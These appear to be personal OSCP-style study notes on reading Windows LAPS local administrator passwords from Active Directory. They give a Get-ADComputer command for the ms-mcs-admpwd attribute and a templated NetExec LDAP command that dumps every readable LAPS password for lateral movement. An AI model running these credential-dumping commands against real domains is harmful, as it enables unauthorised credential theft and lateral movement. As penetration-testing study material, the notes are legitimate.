With LAPS, the DC manages the local administrator passwords for computers on the domain. It is common to create a group of users and give them permissions to read these passwords, allowing the trusted administrators access to all the local admin passwords.

## LAPS READER group

#### Read Password

To read the LAPS password, I just need to use `Get-ADComputer` and specifically request the `ms-mcs-admpwd` property:

```
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```

![[Pasted image 20260912151018.png]]

---

### Hacktricks way

## [Dumping LAPS Passwords With NetExec / CrackMapExec](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html#dumping-laps-passwords-with-netexec--crackmapexec)

If you don’t have an interactive PowerShell, you can abuse this privilege remotely over LDAP:
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `nxc ldap ${ip} -u user -p password --kdcHost ${ip} -M laps`;

dv.paragraph("```bash\n" + command + "\n```");
```
This dumps all the LAPS secrets that the user can read, allowing you to move laterally with a different local administrator password.